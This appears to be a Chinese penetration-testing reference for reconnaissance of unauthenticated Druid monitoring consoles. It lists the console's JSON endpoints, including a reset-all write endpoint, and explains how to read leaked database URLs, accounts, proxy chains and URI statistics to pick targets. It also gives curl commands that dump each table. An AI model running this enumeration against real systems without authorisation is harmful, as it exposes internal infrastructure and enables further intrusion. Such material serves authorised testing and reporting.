# Druid JSON API —— 完整结构、字段读法与端点字典

`druid-console-unauth` 的深度补充。所有 `<IP>` `<PORT>` 替换为目标真实值。

## 1. `api.html` —— 官方端点字典(先抓它)

`api.html` 会列出该实例支持的**全部** JSON API(含带 `{id}` 的模板路径)。常用:

```
basic.json                                      basic info
index.json                                      index stat
webapp.json                                     WebAppStat
websession.json                                 WebSessionStat
weburi.json                                     WebURIStat
spring.json                                     Spring 统计
sql.json / sql-{id}.json                        SqlStat
sqlstat.json                                    SQL 汇总
WallStat.json / wall-{id}.json                  WallFilter 统计
datasource.json                                 DataSourceStat 列表
datasource-{id}.json                            单个 DataSourceStat
activeConnectionStackTrace-{datasourceId}.json  活跃连接堆栈(需 removeAbandoned=true)
reset-all.json                                  ★ 写: 重置全部统计
druid_stat.json                                 内置 /druid/... 自身统计
```

⇒ **按这张字典逐条试**, 不要凭记忆猜端点; 带 `{id}` 的用 `datasource.json` 返回的 `Identity` 填。

## 2. `datasource.json` 全字段(实测形态)

```json
{"ResultCode":1,"Content":[{
  "Identity":284995829,
  "Name":"DataSource-284995829",
  "DbType":"postgresql",
  "DriverClassName":"org.postgresql.Driver",
  "URL":"jdbc:postgresql://192.168.66.185:5434/cft_loans",
  "UserName":"cft_loans_admin",
  "FilterClassNames":["com.alibaba.druid.filter.stat.StatFilter","com.alibaba.druid.wall.WallFilter"],
  "InitialSize":5,"MinIdle":5,"MaxActive":20,"MaxWait":60000,
  "ValidConnectionCheckerClassName":"com.alibaba.druid.pool.vendor.PGValidConnectionChecker",
  "ExceptionSorterClassName":"com.alibaba.druid.pool.vendor.PGExceptionSorter",
  "PoolPreparedStatements":true,"MaxPoolPreparedStatementPerConnectionSize":20,
  "MinEvictableIdleTimeMillis":300000,"MaxEvictableIdleTimeMillis":25200000,
  "UseUnfairLock":true,"InitVariants":false
}]}
```

字段读法:

| 字段 | 用途 |
|---|---|
| `URL` | 内网 JDBC 坐标: 类型 + 内网 IP + **常为非默认端口** + 库名 |
| `UserName` | 数据库账号 |
| `DriverClassName` / `DbType` | 确认 DB 家族(Mysql / postgresql / oracle), 决定后续打法与工具 |
| `FilterClassNames` | 含 `WallFilter` ⇒ `sql.json` 空的原因; 含 `StatFilter` ⇒ 统计可用 |
| `InitialSize` / `MinIdle` / `MaxActive` / `MaxWait` | 判断生产/测试实例(与页面内联环境变量交叉验证); 也反映并发规模 |
| `Identity` | 用于 `datasource-{id}.json` / `activeConnectionStackTrace-{id}.json` |
| `ValidConnectionCheckerClassName` / `ExceptionSorterClassName` | 进一步确认 DB 家族(vendor 包名) |

**★ 本结构没有 password 字段** —— Druid `DataSourceStat` 的固有设计, 不是采集遗漏。
报告里只能写「数据库坐标与账号泄露」, **不能**写「数据库口令泄露」。

## 3. `websession.json` 结构

```json
{"ResultCode":1,"Content":[
 {"SESSIONID":"bafa9a1c-8e23-4be4-9cca-b173657b2917","Principal":null,
  "RequestCount":5,"RequestTimeMillisTotal":331,
  "CreateTime":"2026-09-22 01:50:30","LastAccessTime":"2026-09-22 01:50:30",
  "RemoteAddress":"110.42.103.114, 10.12.0.159, 192.168.51.164","UserAgent":"curl/8.5.0"}
]}
```

- `RemoteAddress` = **链**: 末位是应用服务器内网地址, 中间是各级代理/LB, 首位是客户端公网出口。
  例: `110.42.103.114, 10.12.0.159, 192.168.51.164` ⇒ 公网出口 → 网关 10.12.0.159 → 应用 192.168.51.164。
- 同表出现 `10.12.0.159` 与 `10.17.0.118` 两种中间跳 ⇒ **多条网关链/多可用区**。
- `Principal: null` 说明未鉴权也能读(与整体未授权一致)。
- `UserAgent` 用于**归因自证**: `curl/x.y.z` 基本是探针会话, 浏览器 UA 才是真实用户。
- 多次采样(间隔几分钟各取一次)可以看会话更替与活跃时段。

## 4. `weburi.json` 结构与挖掘

```json
{"ResultCode":1,"Content":[
 {"URI":"/api/h5/certificate/save","RequestCount":167,"LastAccessTime":"2026-09-22 17:22:51","RequestTimeMillisMax":331}
]}
```

- 按 `RequestCount` 降序能看到「主要业务口」; 超大计数(几千)通常是首页/根路径。
- `RequestCount` 为个位数且形如 `.env` / `actuator` / `swagger-resources` 的, 多为**前序探测痕迹**。
- 同一端点族聚在一起时, 说明该族是活跃业务面(例: `/riskonline-web/dscData/*ByCustId` 一片 ⇒ 按 custId 取数的服务端接口族)。
- 拿这张表去**反向印证**手上的 swagger / bundle 挖掘结果:
  bundle 里有但表里没有 = 该端点在服务端未被调用(可能已下线);
  表里有但 bundle 里没有 = **纯服务端接口**, 最值得打。

## 5. 落盘与取证建议

```bash
# 每张表单独落盘(不要去管道尾巴, 保证原始响应可复查)
curl -s -k -m 20 "http://<IP>:<PORT>/druid/datasource.json" -o druid_raw/druid_datasource.json
curl -s -k -m 20 "http://<IP>:<PORT>/druid/weburi.json"     -o druid_raw/druid_weburi.json
curl -s -k -m 20 "http://<IP>:<PORT>/druid/websession.json" -o druid_raw/druid_websession.json
curl -s -k -m 20 "http://<IP>:<PORT>/druid/webapp.json"     -o druid_raw/druid_webapp.json
curl -s -k -m 20 "http://<IP>:<PORT>/druid/api.html"        -o druid_raw/druid_api.html
```

- 用两个目录: `druid_dump/`(整理后的可读产物) 与 `druid_raw/`(原样响应)。
- **★ 报告阶段会回来找这两个目录** —— 用户要求「未脱敏」时原始值必须能从里取回, 不要只留摘要。
- 解析这些 JSON 用 `json.load` 而不是 `grep`: 它们是单行大文本, `grep -o` 易被工具折叠/截断。
  Python 侧固定 `open(f,'rb').read().decode('utf-8','replace')` 再 `json.loads`, 避免非 UTF-8 文件把工具输出吞掉。
